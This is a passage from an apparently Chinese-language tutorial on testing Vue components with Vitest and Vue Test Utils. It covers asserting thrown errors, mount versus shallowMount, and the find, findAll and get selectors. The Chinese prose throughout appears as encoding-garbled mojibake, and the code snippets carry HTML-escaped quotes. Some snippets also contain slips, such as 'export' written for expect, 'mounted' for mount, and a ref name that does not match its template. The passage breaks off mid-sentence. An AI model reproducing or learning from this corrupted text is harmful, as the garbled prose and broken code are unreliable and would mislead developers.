toThrowErrorMatchingInlineSnapshot å…ˆå‰æˆ‘å€‘æœ‰æåˆ°æ¸¬è©¦æ¡ˆä¾‹é æƒ³çš„ä¸‰å€‹è·¯å¾‘(Happy pathã€sad Pathã€Bad Path)ï¼ŒBad Path å¾ç”¢å“è§’åº¦ä¸Šä¾†èªª End-User ä½¿ç”¨ä¸Šçš„éŒ¯èª¤ï¼Œæ‡‰è©²è€ƒæ…®å¾ç”¢å“ä½¿ç”¨è§’åº¦ä¸Šå»æ€è€ƒè¦æ€éº¼å”åŠ©ä»–å€‘å»ä½¿ç”¨ï¼Œæ‰€ä»¥ä¸æ‡‰è©²ç‚ºäº†æ‹‹å‡ºéŒ¯èª¤è€Œæ‹‹å‡ºã€‚\nä½†å‡è¨­ä»Šå¤©æ‹‹å‡ºéŒ¯èª¤çš„æƒ…å¢ƒæ˜¯è¼ƒç‚ºåˆç†çš„éƒ¨åˆ†ï¼Œæ¯”æ–¹æ˜¯é‡å°é–‹ç™¼äººå“¡åœ¨é–‹ç™¼æ™‚æœŸèª¤ç”¨å°è‡´çš„éŒ¯èª¤â‹¯â‹¯ç­‰ç­‰æƒ…æ³ï¼Œé€™æ™‚æˆ‘å€‘å°±å¯ä»¥é€éé€™ä¸€é¡ Matcher ä¾†è™•ç†ã€‚\nè€Œä½¿ç”¨ä¸Šè¦æ¯”è¼ƒå°å¿ƒçš„æ˜¯ï¼Œå—æ¸¬ç›®æ¨™è‹¥æœƒæ‹‹å‡ºéŒ¯èª¤å‰‡è¦é€é wrap function çš„å½¢å¼ä¾†è™•ç†ï¼Œå¦å‰‡æ‹‹å‡ºçš„éŒ¯èª¤æœƒé€ æˆæ¸¬è©¦æ¡ˆä¾‹çš„æ–·è¨€éŒ¯èª¤ï¼š\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;\u0026#39;, ()=\u0026gt;{ const food = (name) =\u0026gt; { // ... if(name === \u0026#39;å°é»ƒç“œ\u0026#39;){ throw new Error(\u0026#39;æˆ‘ä¸åƒå°é»ƒç“œ\u0026#39;) } } expect(food(\u0026#39;å°é»ƒç“œ\u0026#39;)).toThrowError(\u0026#39;æˆ‘ä¸åƒå°é»ƒç“œ\u0026#39;) // è‹¥é€™æ¨£å¯«çš„è©±è£¡é ­çš„ Error æœƒå°è‡´æ¸¬è©¦æ¡ˆä¾‹å¤±æ•— expect(() =\u0026gt; food(\u0026#39;å°é»ƒç“œ\u0026#39;)).toThrowError(\u0026#39;æˆ‘ä¸åƒå°é»ƒç“œ\u0026#39;) // éœ€è¦é€éé€™ç¨®æ–¹å¼æ‰èƒ½æ­£ç¢ºæ–·è¨€ }) å…ƒä»¶æ¸¬è©¦ Vue Test Utils èˆ‡å…ƒä»¶æ¸¬è©¦ æ¥è‘—ï¼Œè‹¥æˆ‘å€‘æƒ³é€²ä¸€æ­¥åœ¨å°ˆæ¡ˆä¸­æ¸¬è©¦ Vue å…ƒä»¶çš„è©±ï¼Œæˆ‘å€‘é™¤äº†åŸºæ–¼å‰é¢çš„æ¦‚å¿µèˆ‡èªæ³•ä¹‹å¤–ï¼Œé‚„å¾—ä¾é èƒ½å¤ å¹«åŠ©èƒ½å¤ è§£æ Vue å…ƒä»¶ä¸¦èˆ‡å…¶æ¨¡æ“¬äº’å‹•çš„å·¥å…·ï¼š\nVue Test Utils Cypress Vue Testing Library è€Œæœ¬ç¯‡å°‡è‘—é‡åœ¨ä»‹ç´¹è¦æ€éº¼é€é Vue Test Utils ä¾†é€²è¡Œèˆ‡ Vue å…ƒä»¶æœ‰é—œçš„ã€Œå…ƒä»¶æ¸¬è©¦ã€ï¼Œå› æ­¤æœ¬æ–‡è¦ä¾†ä»‹ç´¹ä¸€ä¸‹ Vue Test Utils èˆ‡å…ƒä»¶æ¸¬è©¦æ˜¯åœ¨åšä»€éº¼ï¼Œåˆé€™åˆè·Ÿå–®å…ƒæ¸¬è©¦æœ‰ä»€éº¼é—œä¿‚å‘¢ã€‚\nVue-Test-Utils é¦–å…ˆå€è¾¨ä¸€ä¸‹ä»–èˆ‡æˆ‘å€‘ç›®å‰ç”¨åˆ°çš„æ¸¬è©¦å·¥å…·çš„å„è‡ªç”¨è™•ï¼Œæ‰èƒ½æ›´ç­è§£æ¥ä¸‹å­¸çš„å…§å®¹æ˜¯ç”±å“ªå€‹å·¥å…·è² è²¬çš„ï¼Œå°‡ä¾†æœ‰å¿…è¦æŸ¥é–±è³‡æ–™æ™‚å°±èƒ½æ›´æ¸…æ¥šçš„å€åˆ¥ä»–å€‘ã€‚\nVue Test Utils ä¸»è¦æ˜¯ä½œç‚ºæä¾›æ¸¬è©¦ Vue å…ƒä»¶çš„ç›¸é—œå·¥å…·é›†ï¼Œè®“æˆ‘å€‘èƒ½æ›´è¼•æ˜“çš„æ¨¡æ“¬æ“ä½œå…ƒä»¶ä¾†é€²è¡Œæ¸¬è©¦ï¼Œä½†æœ¬èº«ä¸¦æ²’æœ‰é‹è¡Œæ¸¬è©¦ç’°å¢ƒ(test runner)çš„åŠŸèƒ½ï¼Œå› æ­¤æˆ‘å€‘æœƒéœ€è¦è—‰ç”± Vitest ä¾†ä½œç‚ºæ¸¬è©¦ç’°å¢ƒä»¥åŠç›¸é—œçš„æ¸¬è©¦æƒ…å¢ƒæ¡ˆä¾‹èˆ‡æ–·è¨€ Matcherï¼›é™¤æ­¤ä¹‹å¤–æˆ‘å€‘é‚„éœ€è¦ç”¨ä¾†åœ¨ Node ç’°å¢ƒä¸­æ¨¡æ“¬ç€è¦½å™¨ç’°å¢ƒçš„ jsdom ä¾†å”åŠ©è™•ç†æœ‰é—œ DOM ä¸Šçš„æ“ä½œï¼Œå¦‚æ­¤ä¸€ä¾†æ‰èƒ½é †åˆ©åœ°ä½¿ç”¨ Vue Test Utilsã€‚\nè€Œç‰ˆæœ¬çš„éƒ¨åˆ†è¦ç‰¹åˆ¥æ³¨æ„åˆ°ï¼Œç”±æ–¼ Vue Test Utils ç‚ºäº†ç›¸å®¹ Vue ä¸åŒç‰ˆæœ¬ä¹‹é–“çš„ API å› æ­¤æˆ‘å€‘è¦å®‰è£å°æ‡‰çš„ç‰ˆæœ¬æœªä¾†æ‰ä¸æœƒå‡ºéŒ¯ï¼š\nVue 2ï¼šå®‰è£ Vue Test Utils 1 Vue 3ï¼šå®‰è£ Vue Test Utils 2 ç¢ºèªç‰ˆæœ¬æ²’å•é¡Œå¾Œï¼Œæ¨¡æ“¬å…ƒä»¶çš„éƒ¨åˆ†äº¤çµ¦ Vue Test Utils åŸºæœ¬ä¸Šå°±æ²’å•é¡Œäº†ï¼Œä½†é—œæ–¼ã€Œå…ƒä»¶æ¸¬è©¦ã€ç›®æ¨™ä¸»è¦æ˜¯è¦æ¸¬è©¦ä»€éº¼æ±è¥¿å‘¢ï¼Ÿ\nå…ƒä»¶æ¸¬è©¦çš„ç›®æ¨™ æ¸¬è©¦æœ¬è³ªä¸»è¦æ˜¯åœ¨é æœŸçµæœèˆ‡å¯¦éš›æ˜¯å¦ç›¸ç­‰ï¼Œè€Œåœ¨å…ƒä»¶æ¸¬è©¦ä¸­ä½œç‚ºå—æ¸¬ç‰©çš„å…ƒä»¶ï¼Œå…¶æœ¬èº«ä¸»è¦æ˜¯è² è²¬ UI ä¸Šçš„ä¸€åˆ‡å…§å®¹ï¼Œå› æ­¤æˆ‘å€‘æ¸¬è©¦ç›®æ¨™åœ¨è‘—é‡æ–¼å®ƒçš„ã€Œç•«é¢ã€èˆ‡ã€Œè¡Œç‚ºã€ä¸Šæ˜¯å¦å¦‚æˆ‘å€‘æ‰€é æœŸã€‚\nå› æ­¤ï¼Œåœ¨æ¸¬è©¦æ¡ˆä¾‹çš„æ“ä½œéç¨‹ä¸­(ä¹Ÿå°±æ˜¯ 3A ä¸­çš„ Action éšæ®µ)ï¼Œæˆ‘å€‘ä¸»è¦æ˜¯è—‰ç”±æ“ä½œå°å…ƒä»¶ä»‹é¢ä¸­çš„ï¼š\ndata props slot provide directive Event(ç€è¦½å™¨ä¸­çš„äº’å‹•è¡Œç‚º) API response(æ¨¡æ“¬å›æ‡‰) ä¾†åˆ¤æ–·ä¸‹åˆ—æ˜¯å¦å¦‚æˆ‘å€‘æ‰€é æœŸï¼š\nDOM æ¸²æŸ“çµæœ emit è¡Œç‚º å¥½çš„å…ƒä»¶æ¸¬è©¦ ç•¶ç„¶ï¼Œåšåˆ°ä¸Šé¢çš„äº‹é …åŸºæœ¬ä¸Šå·²ç¶“å¯ä»¥ç®—æ˜¯å€‹å…ƒä»¶æ¸¬è©¦äº†ï¼Œè‹¥æˆ‘å€‘æƒ³è®“å…ƒä»¶æ¸¬è©¦å¯«å¾—æ›´å¥½ï¼Œé™¤äº†å…ˆå‰åœ¨å–®å…ƒæ¸¬è©¦æéçš„ä¸€äº›æ¦‚å¿µä¹‹å¤–ï¼Œé‚„æœ‰ä¸€äº›å€¼å¾—æ³¨æ„çš„äº‹é …ï¼š\né¦–å…ˆï¼Œåœ¨æ’°å¯«å…ƒä»¶æ¸¬è©¦æ™‚çš„è§’åº¦ï¼Œæˆ‘å€‘ä¸¦æ²’æœ‰è¦ç•¶å€‹å…¨èƒ½å…¨çŸ¥çš„ç¥ï¼Œè€Œæ˜¯ä½œç‚ºã€Œä½¿ç”¨è€…çš„è§’åº¦ã€é—œæ³¨å…ƒä»¶ä»‹é¢ä¸Šä¾†é æœŸçµæœï¼Œæ‰€ä»¥åœ¨æ¸¬è©¦çš„éç¨‹ä¸­æˆ‘å€‘è¦ã€Œé¿å…åˆå¯«äº†ä¸€æ¬¡å¯¦ä½œã€ã€‚\nå¦å¤–ï¼Œå¦‚æœå…§éƒ¨é‚è¼¯éæ–¼è¤‡é›œæ™‚ï¼Œæˆ‘å€‘å‰‡æ‡‰è©²å…ˆæŠ½å–(extract)å…¶é‚è¼¯ï¼Œé€é composables çš„å¯«æ³•ä¾†å¼•å…¥ï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å°±èƒ½ã€Œå°ˆæ³¨æ–¼åœ¨å…ƒä»¶æœ¬èº«çš„è¡Œç‚ºä¸Šã€ï¼Œå¦å¤–ä¹Ÿèƒ½ã€Œé‡å° composable çš„é‚è¼¯å–®ç¨åšæ¸¬è©¦ã€ã€‚\næœ€å¾Œï¼Œè‹¥å…ƒä»¶ä¸­æœ‰ä½¿ç”¨åˆ° API çš„éƒ¨åˆ†ï¼ŒåŒæ¨£çš„æˆ‘å€‘æ‡‰è©²æŠŠå®ƒç•¶ä½œæˆæ˜¯ä»–æä¾›çµ¦å…ƒä»¶å»ä½¿ç”¨ï¼Œè€Œå…ƒä»¶ä¸»è¦æ˜¯ã€Œæ¥æ”¶å›æ‡‰ã€å¾Œå°±èƒ½è‡ªè¡Œè™•ç†å¾ŒçºŒçš„å…§å®¹äº†ï¼Œæ‰€ä»¥åœ¨æ¸¬è©¦ä¸Šæˆ‘å€‘æ‡‰è©²å°ˆæ³¨åœ¨ API æä¾›äº†ä»€éº¼çµ¦å…ƒä»¶ï¼Œé€éæ¨¡æ“¬è³‡æ–™çš„éƒ¨åˆ†ä¾†é”æˆå…ˆå‰æéçš„ FIRST åŸå‰‡ä¸­çš„ Fastï¼Œæœ€å¾Œæ–·è¨€å…ƒä»¶æœ€çµ‚çš„è¡Œç‚ºæ˜¯å¦å¦‚é æœŸå³å¯ã€‚\nç¾åœ¨æˆ‘å€‘çŸ¥é“ Vue Test Utils åœ¨åšä»€éº¼äº†ï¼Œä¹ŸçŸ¥é“ã€Œå…ƒä»¶æ¸¬è©¦ã€åœ¨åšä»€éº¼äº†ï¼Œä½†é€™è·Ÿå–®å…ƒæ¸¬è©¦åˆæœ‰ä»€éº¼é—œä¿‚å‘¢ï¼Ÿ\nå…ƒä»¶æ¸¬è©¦èˆ‡å–®å…ƒæ¸¬è©¦çš„é—œä¿‚ åœ¨å®˜æ–¹æ–‡ä»¶ä¸­æ¸¬è©¦ç« ç¯€æœ‰æåˆ°ï¼Œå…ƒä»¶æ¸¬è©¦(component testing)åœ¨é¡†ç²’åº¦ä¸Šå…¶å¯¦æ˜¯é«˜æ–¼å–®å…ƒæ¸¬è©¦(unit testing)çš„ï¼Œç”šè‡³å¯ä»¥è¢«è¦–ç‚ºæ˜¯æ•´åˆæ¸¬è©¦(integration testing)çš„ä¸€ç¨®å½¢å¼ã€‚\nè€ŒåŠé–“æœ‰ä¸å°‘æ–‡ç« ç¿’æ…£ä»¥å–®å…ƒæ¸¬è©¦ä¾†çµ±ç¨±é€™ä¸€é¡æ¸¬è©¦ï¼Œæœ€ä¸»è¦åŸå› æ˜¯å–®å…ƒæ¸¬è©¦çš„å®šç¾©ç‚ºã€Œè»Ÿé«”è¨­è¨ˆã€ä¸­æœ€å°å–®ä½çš„ç¨‹å¼æˆ–è¡Œç‚ºï¼Œåœ¨ Vue å°ˆæ¡ˆä¸­ï¼Œè‹¥ä»¥ Vue SFC é¡å‹æª”æ¡ˆ(.vue)ä¾†çœ‹å…¶å¯¦æ¸¬è©¦å…ƒä»¶ä¹Ÿç®—æ˜¯æœ€å°å–®ä½æ²’éŒ¯ã€‚\næ‰€ä»¥å¾æ„ç¾©ä¸Šä¾†åŠƒåˆ†å–®å…ƒæ¸¬è©¦èˆ‡å…ƒä»¶æ¸¬è©¦ï¼ŒæŸæ–¹é¢ä¾†èªªå¾ˆå®¹æ˜“å‡ºç¾æ­§ç•°(ç”šè‡³å–®å…ƒæ¸¬è©¦æœ¬èº«å°±å·²ç¶“æœ‰åˆ†ç‚ºç¨ç«‹å‹èˆ‡ç¤¾äº¤å‹å¯«æ³•äº†)ã€‚\nç„¶è€Œç‚ºäº†æ¥ä¸‹ä¾†åœ¨æœ¬ç³»åˆ—æ–‡ä¸­æ–¹ä¾¿å€åˆ†æŒ‡çš„æ¸¬è©¦å°è±¡æ˜¯å“ªéƒ¨åˆ†ï¼Œæˆ‘å°‡åç¨±å«ç¾©åˆ†ç‚ºï¼š\nå…ƒä»¶æ¸¬è©¦ï¼šé‡å° Vue å…ƒä»¶æ‰€é€²è¡Œçš„æ¸¬è©¦ å–®å…ƒæ¸¬è©¦ï¼šé‡å°å…ƒä»¶å¼•å…¥å‡½å¼ã€é¡åˆ¥ç­‰ utilsã€helper èˆ‡ composable çš„æ¸¬è©¦ã€‚ å·¥å…·æœ¬èº«ï¼šPinia æ¸¬è©¦ã€Vue Router æ¸¬è©¦ã€‚ å…ƒä»¶æ¸¬è©¦ï¼šå®¹å™¨(Wrapper) mount ç•¶æˆ‘å€‘éœ€è¦åœ¨æ¸¬è©¦æ¡ˆä¾‹ä¸­å¼•å…¥å…ƒä»¶æ™‚ï¼Œæˆ‘å€‘å¯ä»¥é€é Vue Test Utils æä¾›çš„æ–¹æ³• mount ä¾†åŒ…è£¹ Vue å…ƒä»¶ã€‚è€Œ mount æ‰€è¿”å›çš„å…§å®¹é™¤äº† Vue å¯¦é«”ä¹‹å¤–ï¼Œé‚„åŒ…å«äº†ä¸€äº›æ–¹æ³•ï¼ˆWrapper methodsï¼‰å¯ä»¥è®“æˆ‘å€‘æ“ä½œå…ƒä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import component from \u0026#39;@/component/BaseButton.vue\u0026#39; it(\u0026#39;should emit clicked event after clicking button\u0026#39;, () =\u0026gt; { // Arrange const wrapper = mount(component) // Act wrapper.trigger(\u0026#39;click\u0026#39;) // Assert export(wrapper.emitted()).toHaveProperty(\u0026#39;clicked\u0026#39;) }) å‡è‹¥æˆ‘å€‘å¸Œæœ›åœ¨æ¸²æŸ“å…ƒä»¶çš„æ™‚å€™åŒæ™‚å¸¶è‘—é è¨­åƒæ•¸èˆ‡ç‹€æ…‹æ™‚ï¼ˆå¦‚ propsã€slots\u0026hellip;ç­‰ï¼‰ï¼Œå°±èƒ½å¤ é€é mount æ–¹æ³•çš„ç¬¬äºŒå€‹åƒæ•¸å‚³å…¥è¨­å®šï¼š\n1 2 3 4 5 6 7 const options = { props: { content: \u0026#39;Hello, Props!\u0026#39; } } const wrapper = mounted(component, options) expect(wrapper.text()).toBe(\u0026#39;Hello, Props!\u0026#39;) è€Œé—œæ–¼æ–¹æ³•ï¼ˆWrapper methodsï¼‰èˆ‡é¸é …ï¼ˆWrapper optionsï¼‰çš„éƒ¨åˆ†ï¼Œæœƒæ ¹æ“šå…ƒä»¶ä½¿ç”¨ Options API / Composition API / setup script èªæ³•ç³– è€Œæœ‰ä¸åŒçš„ç”¨æ³•èˆ‡é™åˆ¶ï¼Œå› æ­¤ä½¿ç”¨æ–¹æ³•èˆ‡å·®ç•°çš„éƒ¨åˆ†å°‡åœ¨å¾ŒçºŒæ¸¬è©¦å„ç¨®å…ƒä»¶æ™‚é™¸çºŒæœƒæåˆ°ã€‚\nshallowMount åœ¨æ­£å¸¸çš„å°ˆæ¡ˆé–‹ç™¼ä¸‹ï¼Œå…ƒä»¶æ™‚å¸¸æœƒåµŒå…¥äº†å¦ä¸€å€‹å…ƒä»¶ï¼š\nRootComponent.vue 1 \u0026lt;ParentComponent\u0026gt;\u0026lt;/ParentComponent\u0026gt; ParentComponent.vue 1 2 3 \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; \u0026lt;ChildComponent\u0026gt;\u0026lt;/ChildComponent\u0026gt; ChildComponent.vue 1 \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; RootComponent çš„å…ƒä»¶æ¸¬è©¦ï¼š\n1 2 3 4 5 6 7 8 9 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) expect(wrapper.html()).toBe(` \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; `) }) ä½†å¦‚æ­¤ä¸€ä¾†è‹¥æˆ‘å€‘åœ¨æ¸¬è©¦ RootComponent å…ƒä»¶çš„æ™‚å€™ï¼Œå°±æœ‰å¯èƒ½å› ç‚ºåº•ä¸‹çš„ ChildComponent å…ƒä»¶æ›´æ”¹äº†å…§å®¹å°è‡´ RootComponent æ¸¬è©¦æ¡ˆä¾‹ä¹Ÿè·Ÿè‘—å¤±æ•—ï¼š\n1 \u0026lt;p\u0026gt;baby\u0026lt;/p\u0026gt; è‹¥ã€Œæœ‰æ„ã€æƒ³è¦é¿å…é€™ç¨®æƒ…æ³ç™¼ç”Ÿï¼Œæ­¤æ™‚å°±å¯ä»¥å°‡ mount æ›¿æ›æ‰ï¼Œæ”¹ä½¿ç”¨ shallowMount ä¾†ä½œç‚ºå®¹å™¨ä½¿ç”¨ï¼š\n1 2 3 4 5 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = shallowMount(component) // ... }) shallowMount èˆ‡ mount åœ¨ä½¿ç”¨ä¸Šå¹¾ä¹å¤§åŒå°ç•°ï¼Œè€Œå”¯ä¸€æœ‰å·®åˆ¥åœ¨æ–¼ä»–æœƒå°‡åŸå…ˆå…§éƒ¨æœ‰ç”¨åˆ°å…ƒä»¶çš„éƒ¨åˆ†ä»¥æ›¿æ›ç‚ºä¸€å€‹æ¨¡æ“¬å…ƒä»¶ï¼ˆstub componentï¼‰ï¼Œä¸¦ä¸”å‘½åæ”¹ä»¥çƒ¤è‚‰ä¸²å‘½åæ³•ï¼ˆKebab caseï¼‰ä¸¦ä¸”åœ¨æœ€æœ«ç«¯åŠ ä¸Š -stub ä¾›è¾¨è­˜ï¼š\nRootComponent.vue 1 \u0026lt;ParentComponent\u0026gt;\u0026lt;/ParentComponent\u0026gt; ç¶“ shallowMount æ¸²æŸ“çµæœè®Šæˆï¼š\nRootComponent.vue 1 \u0026lt;parent-component-stub\u0026gt;\u0026lt;/parent-component-stub\u0026gt; å¦‚æ­¤ä¸€ä¾†åœ¨æ’°å¯«æ¸¬è©¦æ¡ˆä¾‹æ™‚ï¼Œå°±å¯ä»¥é—œæ³¨åœ¨ç•¶ä¸‹ã€Œçˆ¶å±¤å…ƒä»¶ã€èˆ‡ã€Œå­å±¤å…ƒä»¶ã€çš„ä¹‹é–“çš„å…§å®¹ï¼Œè€Œä¸ç®¡ã€Œå­å±¤å…ƒä»¶ã€åº•ä¸‹æ‰€ç™¼ç”Ÿçš„äº‹æƒ…ï¼š\n1 2 3 4 5 6 import component from \u0026#39;./RootComponent.vue\u0026#39; it(\u0026#39;should render corrent content\u0026#39;, async () =\u0026gt; { const wrapper = shallowMount(component) // ... expect(wrapper.html()).toBe(`\u0026lt;parent-component-stub\u0026gt;\u0026lt;/parent-component-stub\u0026gt;`) }) å®¹å™¨çš„æ–¹æ³•ï¼ˆWrapper methodsï¼‰ - é¸æ“‡å™¨ åœ¨é€²è¡Œæ¸¬è©¦æ™‚ï¼Œå‰é¢ç« ç¯€æœ‰æåˆ°æˆ‘å€‘æœƒä½¿ç”¨ mount æˆ– shallowMount ä¾†åŒ…è£¹å…ƒä»¶ï¼Œå¾è€Œå¾—åˆ°ä¸€å€‹ VueWrapperï¼Œè€Œåœ¨é€™å€‹ VueWrapper è£¡é ­æœ‰è¨±å¤šå¯¦ç”¨çš„å®¹å™¨æ–¹æ³•ï¼ˆWrapper methodsï¼‰ï¼Œé›–ç„¶å®˜æ–¹æ–‡ä»¶ä¸­ä¸¦æ²’æœ‰ç‰¹æ„åˆ†é¡ï¼Œä½†å¤§æ„ä¸Šå¯åˆ†ç‚ºå¹¾ç¨®æ–¹æ³•ï¼š\næŸ¥è©¢ã€é¸æ“‡æŒ‡å®šçš„å…ƒç´ ã€å…ƒä»¶ç­‰é¸æ“‡å™¨ å–å¾—ç›®æ¨™å±¬æ€§æˆ–å…§å®¹ï¼ˆclass, attributeï¼‰ è§¸ç™¼ DOM äº‹ä»¶ï¼ˆå¦‚æ»‘é¼ é»æ“Šã€éµç›¤è¼¸å…¥èˆ‡æŒ‰éµâ‹¯â‹¯ç­‰ï¼‰ å–å¾— emit äº‹ä»¶ã€è¨­ç½® data æˆ– propã€ç”šè‡³è§¸ç™¼å…ƒä»¶ unmmount ç­‰ Vue API ç›¸é—œçš„æ–¹æ³• é€™é‚Šè‘—é‡åœ¨æ–¼ä»‹ç´¹é¸æ“‡å™¨çš„æ–¹æ³•ä½¿ç”¨èˆ‡æ¸¬è©¦æ‡‰ç”¨ï¼Œæœ€å¾Œè£œä¸Šç›¸é—œçš„è¨è«–ï¼š\nå…ƒç´ ã€å…ƒä»¶é¸æ“‡å™¨ åˆ¤æ–·ç›®æ¨™æ˜¯å¦å­˜åœ¨ï¼šexists èˆ‡ isVisible ä½¿ç”¨ data-* attribute é¸æ“‡å™¨ åœ¨é€²è¡Œå…ƒä»¶æ¸¬è©¦ï¼ˆcomponent testingï¼‰çš„éç¨‹ä¸­ï¼Œæœ‰æ™‚æˆ‘å€‘å¯èƒ½åªæƒ³é—œæ³¨åœ¨æŸå€‹ç‰¹å®š DOM æˆ–å…ƒä»¶çš„ç›¸é—œè³‡è¨Šæ™‚ï¼Œé€™æ™‚æˆ‘å€‘å°±å¯ä»¥é€éå®¹å™¨ä¸­çš„é¸æ“‡å™¨æ–¹æ³•ä¾†å°‹æ‰¾ï¼Œè€Œé¸æ“‡å™¨æ ¹æ“šé¸å–å°è±¡çš„ä¸åŒï¼Œä¸»è¦åˆ†ç‚ºï¼š\nå…ƒç´ ï¼ˆelementï¼‰é¸æ“‡å™¨ å…ƒä»¶ï¼ˆcomponentï¼‰é¸æ“‡å™¨ å…ƒç´ é¸æ“‡å™¨ å…ƒç´ é¸æ“‡å™¨èªæ³•åŸºæœ¬ä¸Šæœ‰å…©ç¨®å¯«æ³•ï¼Œä¸€ç¨®æ˜¯åŸºæ–¼å…ƒç´ çš„ refsï¼Œå¦ä¸€ç¨®å‰‡æ˜¯ querySelectorï¼š\n1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;p ref=\u0026#34;dogcat\u0026#34;\u0026gt;???\u0026lt;/p\u0026gt; \u0026lt;p id=\u0026#34;dog\u0026#34;\u0026gt;ç§‘åŸº\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;æ©˜è²“\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;é»‘é»‘\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; 1 2 3 4 5 6 /* ref */ wrapper.find({ ref: \u0026#39;span\u0026#39; }) /* querySelector */ wrapper.find(\u0026#39;#dog\u0026#39;) wrapper.find(\u0026#39;.cat\u0026#39;) è€Œå®¹å™¨æ–¹æ³•æœ‰é—œé¸å–å…ƒç´ çš„é¸æ“‡å™¨ä¸€å…±åˆ†ç‚ºä¸‰ç¨®ï¼š\nfind findAll get é€™ä¸‰ç¨®é¸æ“‡å™¨åœ¨é¸å–åˆ°ç›®æ¨™å¾Œä¸»è¦éƒ½æ˜¯è¿”å› DOMWrapperï¼Œæ­¤æ™‚æˆ‘å€‘å°±å¯ä»¥åœ¨ä¸²é€£å…¶ä»–å®¹å™¨æ–¹æ³•ï¼ˆWrapper methodsï¼‰å¦‚ classes æˆ– text ç­‰ç­‰ä¾†å–å¾—å±¬æ€§æˆ–å…§å®¹è³‡è¨Šï¼Œåªæ˜¯è¿”å›çš„çµæœå…§å®¹æœƒæœ‰äº›å·®ç•°ã€‚\næ¯”æ–¹ findã€findAll çš„éƒ¨åˆ†ä¸»è¦å·®åˆ¥åœ¨æ–¼ findAll è¿”å›çš„å…§å®¹æœƒè¢«æ”¾ç½®æ–¼é™£åˆ—ç•¶ä¸­ï¼š\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;p id=\u0026#34;dog\u0026#34;\u0026gt;ç§‘åŸº\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;æ©˜è²“\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;cat\u0026#34;\u0026gt;é»‘é»‘\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; è€Œæˆ‘å€‘å¯ä»¥é€éåƒé€™æ¨£çš„æ–¹å¼å–å¾—é™£åˆ—å…§çš„è³‡è¨Šï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 it(\u0026#39;should be display correct content\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target= wrapper.find(\u0026#39;#dog\u0026#39;) // \u0026lt;DOMWrapper\u0026gt; expect(target.text()).toBe(\u0026#39;ç§‘åŸº\u0026#39;) }) it(\u0026#39;should be display correct content\u0026#39;, () =\u0026gt; { const wrapper = mount(component) const target= wrapper.findAll(\u0026#39;.cat\u0026#39;) // \u0026lt;DOMWrapper\u0026gt;[] expect(target[0].text()).toBe(\u0026#39;æ©˜è²“\u0026#39;) expect(target[1].text()).toBe(\u0026#39;é»‘é»‘\u0026#39;) }) æ³¨æ„ï¼šé€é findAll æ–·è¨€æ™‚æ˜¯ã€Œæœ‰åºã€çš„ï¼Œå¾ˆå®¹æ˜“å—åˆ°é †åºæ”¹è®Šè€Œå°è‡´æ¸¬è©¦æ¡ˆä¾‹å¤±æ•—ï¼Œé™¤éæ’°å¯«æ¸¬è©¦æ¡ˆä¾‹ç›®æ¨™ä¹‹ä¸€å°±æ˜¯è¦ç¢ºä¿é †åºä¸æœƒèª¿å‹•ï¼Œå¦å‰‡æ”¹ç”¨ find æ–·è¨€æœƒæ¯”è¼ƒä¸å®¹æ˜“å—å½±éŸ¿ã€‚\nè€Œ find èˆ‡ get çš„å·®åˆ¥åœ¨æ–¼ find æ‰¾ä¸åˆ°ç›®æ¨™æ™‚è¿”å›çš„æ˜¯ {} å¾ŒçºŒè‹¥ä»ç¹¼çºŒæ“ä½œã€æ–·è¨€æ™‚æ‰æœƒç”±æ‹‹å‡ºéŒ¯èª¤ï¼ˆç”± ErrorWrapper æä¾›ï¼‰ï¼›ç„¶è€Œ get ä¸€é–‹å§‹è‹¥æ‰¾ä¸åˆ°ç›®æ¨™æ™‚å°±ç›´æ¥æ‹‹å‡ºéŒ¯èª¤ï¼ˆthrow Errorï¼‰äº†ã€‚\næ ¹æ“š ErrorWrapper åŸå§‹ç¢¼ï¼Œå¯ä»¥çœ‹è¦‹ä»–ä¸»è¦æ˜¯é‡å°å®¹å™¨æ–¹æ³•ä¸­çš„ exists() æœƒè¿”å› falseã€‚\nå› æ­¤åœ¨é‡å°æ‰¾ä¸åˆ°å…ƒç´ çš„æ¸¬è©¦æ¡ˆä¾‹åˆæ³•çš„å¯«æ³•å¯ä»¥é€™éº¼åšï¼š\n1 2 expect(() =\u0026gt; wrapper.get(\u0026#39;.something-that-does-not-exist\u0026#39;)).toThrowError() expect(wrapper.find(\u0026#39;.something-that-does-not-exist\u0026#39;).exists()).toBeFalsy() find åˆ¤æ–·å…ƒç´ é™·é˜± é­”é¬¼è—åœ¨ç´°ç¯€è£¡ï¼Œæˆ–è¨±ä½ å¯èƒ½æœƒæƒ³èªªç‚ºä»€éº¼ä¸ç›´æ¥ç”¨ find é‚„è¦å†å¦å¤–é€é exists åˆ¤æ–·å‘¢ï¼Œè®“æˆ‘å€‘çœ‹çœ‹ä¸€å€‹æ¡ˆä¾‹ï¼š\n1 \u0026lt;p\u0026gt;ç„¡é—œç·Šè¦çš„æ±è¥¿\u0026lt;/p\u0026gt; å¦‚æœé€™æ™‚ä½ é€™éº¼å¯«äº†ï¼š\n1 2 expect(wrapper.find(\u0026#39;.something-that-does-not-exist\u0026#39;)).toBeTruthy() // é€šé ï¼ï¼Ÿ åŸå› 